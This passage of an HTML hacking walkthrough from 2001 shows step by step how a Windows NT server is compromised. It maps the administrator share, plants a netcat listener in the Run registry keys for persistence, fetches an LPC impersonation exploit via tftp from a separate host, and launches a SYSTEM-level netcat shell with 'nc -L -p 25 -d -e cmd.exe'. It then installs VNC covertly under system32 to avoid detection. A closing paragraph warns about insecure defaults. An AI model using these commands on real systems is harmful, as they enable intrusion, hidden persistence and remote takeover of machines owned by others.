+<P STYLE="margin-bottom: 0in">I took all of 2 seconds to crack! 
+</P>
+<P STYLE="margin-bottom: 0in">'I thought you said the SAM database
+was encrypted?' I hear you ask.</P>
+<P STYLE="margin-bottom: 0in">Well Microsoft, in their efforts to
+maintain backwards compatibility with older versions of Windows, uses
+a hashing (one-way encryption) algorithm left over from Microsoft's
+first foray into networking, LanManager. Even though NT has a newer,
+stronger algorithim, the OS must still store a copy of the LanManager
+hash, which has been reverse engineered, and is is quite trivial to
+crack as evidenced above.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<H4>Exploit # 4 -- Registry Startup Keys</H4>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Details taken from Hacking Exposed,
+www.hackingexposed.com</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">One track we can follow from here is to
+open the registry remotely, and do all sorts of things.</P>
+<P STYLE="margin-bottom: 0in">First we need to make a connection to
+the machine as you can't enter a username using regedit. So we can
+map a drive to the cracked box from our own Windows machine.:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>H:\&gt;net
+use q: \\192.168.1.2\d$ /user:administrator *</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Type
+the password for \\192.168.1.2\d$:</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>The
+command completed successfully.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Now we can use regedit to connect:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715797.jpg" NAME="Graphic3" ALIGN=BOTTOM WIDTH=293 HEIGHT=131 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715799.jpg" NAME="Graphic4" ALIGN=BOTTOM WIDTH=576 HEIGHT=221 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">From here we can add all sorts of fun
+stuff to the startup keys of the registry.</P>
+<P STYLE="margin-bottom: 0in">Some good places to start are:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><B><FONT SIZE=2>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</FONT></B>
+and</P>
+<H3>RunOnce, RunOnceEx, RunServices</H3>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Let's for example place a netcat
+listener in here, that will have System level privs.</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715801.jpg" NAME="Graphic5" ALIGN=BOTTOM WIDTH=576 HEIGHT=158 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Now the next time the machine is
+rebooted, or someone logs off and on, we will have started our
+program.</P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">[insert a few hours or days wait here?]</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[thorsten@gundam
+thorsten]$ nc 192.168.1.2 50</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Microsoft(R)
+Windows NT(TM)</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>(C)
+Copyright 1985-1996 Microsoft Corp.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\WINNT\Profiles\Administrator\Desktop&gt;whoami</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>whoami</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>NTKRKR\Administrator</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Very nice. But cumbersome to have to
+wait for the machine to be rebooted.</P>
+<P STYLE="margin-bottom: 0in">We could always use some other exploits
+to have the machine rebooted,</P>
+<P STYLE="margin-bottom: 0in">however there are even easier methods.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<H4>Exploit # 5 -- Spoofed LPC Port Request</H4>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">The Local Procedure Call Ports facility
+is a message passing system provided by NT that allows threads and
+processes on the same machine to communicate with each other.</P>
+<P STYLE="margin-bottom: 0in">A function which supports this,
+designed to allow a server thread to impersonate a client thread and
+take actions on its behalf, can be exploited to allow arbitrary
+commands to be run under any user context.</P>
+<P STYLE="margin-bottom: 0in">From our IUSR_NTKRKR interactive shell
+we can upload and use a program which will exploit this. 
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\Inetpub\scripts&gt;tftp
+-i 172.16.41.71 GET hk.exe</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>tftp
+-i 172.16.41.71 GET hk.exe</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Transfer
+successful: 32768 bytes in 1 second, 32768 bytes/s</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<H2>D:\Inetpub\scripts&gt;hk nc -L -p 25 -d -e cmd.exe</H2>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>hk
+nc -L -p 25 -d -e cmd.exe</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>lsass
+pid &amp; tid are: 50 - 53</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Launching
+line was: nc -L -p 25 -d -e cmd.exe</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Who
+do you want to be today?NtImpersonateClientOfPort succeeded</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Then we from another terminal we can
+then hit the new netcat port.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[thorsten@gundam
+thorsten]$ nc 192.168.1.2 25</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Microsoft(R)
+Windows NT(TM)</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>(C)
+Copyright 1985-1996 Microsoft Corp.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\Inetpub\scripts&gt;whoami</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>whoami</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>NT
+AUTHORITY\SYSTEM</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Now we have achieved a nice level of
+success. We have an interactive system level command shell. We can do
+anything we could if we were sitting on the console of the real box.
+But still, I hear you complain, 'Bah! What good is this? The real
+power of NT lines in it's GUI.'. 
+</P>
+<P STYLE="margin-bottom: 0in">Never satisfied are you?</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Ok, one last trick:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><B>Exploit # 6 - Remote Control of the
+NT GUI.</B></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">VNC is a remote control program from
+those clever guys at AT&amp;T Labs (although they got it when they
+acquired Olivetti Research Labs!). It has numerous fine features.
+Firstly it is free, yah! Secondly, it a light weight easy to use
+program, and thirdly, installing it remotely via the command line is
+not any harder than installing it locally.</P>
+<P STYLE="margin-bottom: 0in">First we need the executables. I
+downloaded an installed the program on my windows laptop, so I can
+copy the files from there. We need winvnc.exe, vnchooks.dll, and
+omnithread_rt.dll. Any directory should work, but it should be harder
+to detect if you put it somewhere underneath the %systemroot%. 
+</P>
+<P STYLE="margin-bottom: 0in">Remember we mapped a drive over
+earlier? I can just copy the files over directly using network
+neighbourhood now! I put omnithread_rt.dll in the \winnt\system32\
+directory, and winvnc.exe and vnchook.dll in \winnt\system32\viewers.</P>
+<P STYLE="margin-bottom: 0in">Next I need to add some registry
+entries to the remote machine. The values needed can be found on your
+own machine, if you do an install and monitor the Registry keys to
+see what has been changed.</P>
+<P STYLE="margin-bottom: 0in">I create a file called &quot;winvnc.ini&quot;:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3</P>
+<P STYLE="margin-bottom: 0in">	SocketConnect = REG_DWORD 0x0000001</P>
+<P STYLE="margin-bottom: 0in">	Password = REG_BINARY 0x0000008
+0x57bf2d2e 0x9e6cb06e 
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">This password value is for the word
+'secret'.</P>
+<P STYLE="margin-bottom: 0in">We can install this from our own
+machine using regini and specifying the remote address:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<H2> C:\&gt;regini -m \\192.168.1.2 winvnc.ini</H2>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Now back to our remote machine:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\WINNT\system32\viewers&gt;winvnc
+-install</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>winvnc
+-install</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">This step installs vnc as a service, so
+that it does not need anyone logged on to the box.</P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\WINNT\system32\viewers&gt;net
+start winvnc</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>net
+start winvnc</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>The
+VNC Server service is starting.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>The
+VNC Server service was started successfully.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">And this one starts it</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Now from anyone of our attack boxes,
+all we have to do is launch the vncviwer program:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715803.jpg" NAME="Graphic6" ALIGN=BOTTOM WIDTH=396 HEIGHT=127 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715805.jpg" NAME="Graphic7" ALIGN=BOTTOM WIDTH=336 HEIGHT=101 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Now I really enjoy running vncviwer
+from my Linux box. Theres something fun about having full control of
+an NT server from within Linux. Muh-ha-ha-ha-ha!</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715806.jpg" NAME="Graphic8" ALIGN=BOTTOM WIDTH=575 HEIGHT=432 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">What more could you ask for? ;-)</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Conclusions -- 
+</P>
+<P STYLE="margin-bottom: 0in">It was much easier to hack a Windows NT
+box than i ever imagined, and after years being a sys admin, this was
+scary thought indeed. The fact is, this problem does not just affect
+Microsoft products, as has been recently shown through the Ramen worm
+which exploited default settings in RedHat Linux servers. The problem
+is two pronged, Companies who ship their products in a default
+insecure state, and system administrators who are unaware of these
+insecurities. With the amount of high profile viruses and internet
+attacks in recent months, security has definitely been brought to the
+forefront and being taken more seriously now.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">January 2001</P>
+<P STYLE="margin-bottom: 0in">Thorsten Sideb0ard.</P>
+<P STYLE="margin-bottom: 0in"><a href="britneysnthackguide.doc">Download Word Version</a></P>
+</BODY>
+</HTML>
